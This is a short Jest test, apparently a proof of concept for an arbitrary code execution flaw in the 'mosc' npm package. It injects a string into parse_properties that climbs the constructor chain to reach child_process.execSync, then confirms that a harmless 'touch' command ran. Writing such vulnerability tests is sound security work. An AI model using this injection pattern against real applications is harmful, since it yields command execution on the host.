test("Arbitrary code execution in mosc", () => {
  const fs = require("fs");
  const path = "./mosc";

  expect.assertions(2);
  fs.unlink(path, function (err) {});
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  var A = require("mosc");
  let a = new A({});
  let key = "";
  let attack_code = `1 + (import('test').catch((e)=>{})['constructor']['constructor']('return process')().mainModule.require('child_process').execSync('touch ${path}'))`;
  let properties = "{a:*1*; " + attack_code + " //*}";
  let base = "";
  try {
    a.parse_properties(key, properties, {}, {});
  } catch (error) {console.log(error)}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
